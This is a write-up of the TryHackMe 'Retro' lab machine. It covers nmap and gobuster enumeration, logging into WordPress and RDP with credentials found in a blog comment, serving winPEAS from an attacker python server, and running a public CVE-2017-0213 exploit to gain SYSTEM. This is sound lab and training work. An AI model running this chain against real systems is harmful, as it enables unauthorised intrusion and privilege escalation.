# Retro - THM
###  Difficulty level: Hard
------------------------------------------------------

Let's start with nmap scan:

```bash
nmap -sV -sC -Pn 10.10.254.2 -oN nmap_scan	
```
Results:
```bash
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2023-04-02T09:49:52
|_Not valid after:  2023-10-02T09:49:52
|_ssl-date: 2023-04-03T09:53:51+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2023-04-03T09:53:47+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
From this scan I can cocnlude this machine running on a Windows OS,
Also, ports 80 (http) and 3389 (rdp) are open, I'll start investigate the web page.

There is nothing on the first page:

![image](https://user-images.githubusercontent.com/114166939/229806780-8a9ddf5e-fe89-4eb4-863e-d5840f5420a0.png)


I'll try to find hidden directories on this web with gobuster:
```bash
gobuster dir -u http://10.10.254.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt > dirs
```

Results:
```
/retro
```
First thing to see, this site built with WordPress, it can be noticed with wappalyzer extension.

![image](https://user-images.githubusercontent.com/114166939/229808095-c74ae384-0c2c-43d5-baa5-8b59b6492935.png)

Also, I'll run another brute-force directory to see if there are another hidden directories under the "/retro" directory:
```bash
gobuster dir -u http://10.10.254.2/retro/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt > RetroDirs
```

Results:
```
/wp-includes
/wp-admin	
/wp-content
```
Also, after some crawling on the "/retro" directory, I found a comment at "http://10.10.254.2/retro/index.php/2019/12/09/ready-player-one/":

![image](https://user-images.githubusercontent.com/114166939/229811797-f0870872-40aa-4ff0-a587-e733349a2634.png)

Probably the word "parzival" means something.

Because this is a WordPress web, I can tell there is a wp-login directory here,
It's on the "http://10.10.254.2/retro/wp-login.php".

As a username I'll use "wade", the user who wrote the comment, and as a password I'll use "parzival".

Success login!

![image](https://user-images.githubusercontent.com/114166939/229812841-a178a7ae-d8fc-4fd3-b5d4-fdc33fa01a2c.png)

I'll guess this credentials will work with the RDP service too because of it's name - "RetroWeb".

I'm going to use "remmina" service to connect:

![image](https://user-images.githubusercontent.com/114166939/229813708-4c98ac5d-b856-4f54-8c11-7ba124d2c775.png)

Connected!

On the desktop there is a file called "user.txt", It can be easily opened and I have the first flag!

![image](https://user-images.githubusercontent.com/114166939/229814249-5c437137-4cdf-4056-8aa6-8e5321dc3743.png)

Next, I'll open a cmd for gathering more information about this machine:
```cmd
systeminfo
```
Results:

![image](https://user-images.githubusercontent.com/114166939/229815473-c090618e-7110-4040-b16a-26dd2166361f.png)

This is x64 processor architecture, windows servers 2016, standalone computer.

```cmd
net users && net localgroup
```

![image](https://user-images.githubusercontent.com/114166939/229816484-d7fcea0c-7de4-4a59-8b80-600fc8559e53.png)

```cmd
net localgroup Administrators
```

![image](https://user-images.githubusercontent.com/114166939/229817126-ffcf7ce4-1ce4-4685-a2c3-e53344edbea4.png)

Wade is a weak user I'll try privilege escalation.

For that I'll need winPEASx64.exe from "https://github.com/carlospolop/PEASS-ng/releases/tag/20230402".

Next, I'll run a python3 server to download it on the victim machine:
```python3
python3 -m http.server
```

I'll open "Google chrome" and run "http://10.14.50.11:8000/winPEASx64.exe", download the file
and run it.

One of the many vulnerabilities it found is "CVE-2017-0213"!


This CVE exploit the kernel and grant NT-AUTHORITY permissions.

I found a github page with this exploit "https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213",

Download to my machine the "CVE-2017-0213_x64.zip", unzip it, and now I'll upload it to the victim machine as I did before, with python3 server.


I'll run the file from the cmd:
```cmd
CVE-2017-0213_x64.exe
```

![image](https://user-images.githubusercontent.com/114166939/229829593-df5bbce4-09b4-40c5-bec5-a7e50282217b.png)


Got NT-AUTHORITY user!

Now all left to do is to open the Administrator directory and print the "root.txt" flag!

```cmd
type C:\Users\Administrator\Desktop\root.txt.txt
```

![image](https://user-images.githubusercontent.com/114166939/229826500-f97a8b4f-e697-44d8-b1da-ba574e0b50e8.png)

